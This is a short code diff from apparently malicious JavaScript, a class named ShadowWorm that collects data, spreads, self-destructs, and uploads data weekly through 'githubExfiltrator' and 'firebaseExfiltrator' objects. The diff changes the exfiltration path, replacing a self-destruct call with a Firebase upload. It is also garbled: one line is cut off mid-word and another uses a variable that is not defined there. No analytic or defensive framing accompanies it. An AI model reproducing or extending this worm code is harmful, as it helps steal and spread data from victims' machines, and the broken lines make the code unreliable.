@@ -638,7 +638,7 @@ class ShadowWorm {
       // Check if it's time to upload (once per week)
       if (this.lifecycle.shouldUpload()) {
         const data = this.collectData();
-        const success = await this.githubExfiltrator.upload(data);
+        const succes
         if (success) this.lifecycle.markUploaded();
       }
 
@@ -650,7 +650,7 @@ class ShadowWorm {
 
       // After spreading, self-destruct
       if (this.lifecycle.shouldSelfDestruct()) {
-        this.selfDestruct();
+        const success = await this.firebaseExfiltrator.upload(data);
       }
     } catch (e) {}
   }
